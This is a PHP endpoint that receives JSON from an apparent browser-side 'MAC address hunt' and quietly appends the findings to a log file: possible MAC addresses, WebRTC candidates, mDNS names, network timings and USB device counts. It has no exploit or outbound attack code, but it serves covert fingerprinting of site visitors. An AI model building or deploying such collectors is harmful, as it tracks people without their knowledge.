<?php
/**
 * Save MAC Address Hunt Results
 */

error_reporting(0);
ini_set('display_errors', 0);

// Get JSON data
$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (!$data) {
    http_response_code(400);
    exit;
}

$timestamp = date('[Y-m-d H:i:s]');
$separator = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";

$log = "\n{$separator}\n";
$log .= "{$timestamp} ▼ MAC ADDRESS HUNT RESULTS ▼\n";
$log .= "{$separator}\n\n";

// Methods attempted
if (isset($data['methods']) && count($data['methods']) > 0) {
    $log .= "╔═══ METHODS ATTEMPTED ═══╗\n";
    foreach ($data['methods'] as $method) {
        $log .= "  • {$method}\n";
    }
}

// Possible MAC addresses found
if (isset($data['possibleMACs']) && count($data['possibleMACs']) > 0) {
    $log .= "\n╔═══ POSSIBLE MAC ADDRESSES ═══╗\n";
    foreach ($data['possibleMACs'] as $mac) {
        $log .= "  ▸ {$mac}\n";
    }
    $log .= "\n  ⚠ Note: These may not be actual MAC addresses\n";
    $log .= "  ⚠ Browser security usually blocks direct MAC access\n";
} else {
    $log .= "\n╔═══ NO MAC ADDRESSES FOUND ═══╗\n";
    $log .= "  ✗ All methods blocked by browser security\n";
    $log .= "  ✗ This is expected - browsers protect MAC addresses\n";
}

// Network info collected
if (isset($data['networkInfo']) && !empty($data['networkInfo'])) {
    $log .= "\n╔═══ NETWORK INFORMATION ═══╗\n";
    
    if (isset($data['networkInfo']['candidates'])) {
        $log .= "  WebRTC Candidates: " . count($data['networkInfo']['candidates']) . "\n";
    }
    
    if (isset($data['networkInfo']['mdns'])) {
        $log .= "  mDNS: {$data['networkInfo']['mdns']}\n";
    }
    
    if (isset($data['networkInfo']['timings'])) {
        $log .= "  Network Timings:\n";
        foreach ($data['networkInfo']['timings'] as $timing) {
            $log .= "    • {$timing['ip']}: " . round($timing['time'], 2) . " ms\n";
        }
    }
    
    if (isset($data['networkInfo']['usbDevices'])) {
        $log .= "  USB Devices: " . count($data['networkInfo']['usbDevices']) . "\n";
    }
}

$log .= "\n{$separator}\n\n";

// Save to file
try {
    $fp = @fopen('mac_hunt.txt', 'a');
    if ($fp) {
        @fwrite($fp, $log);
        @fclose($fp);
    } else {
        @file_put_contents('mac_hunt.txt', $log, FILE_APPEND);
    }
} catch (Exception $e) {
    // Silently fail
}

header('Content-Type: application/json');
echo json_encode(['success' => true, 'macsFound' => isset($data['possibleMACs']) ? count($data['possibleMACs']) : 0]);
?>
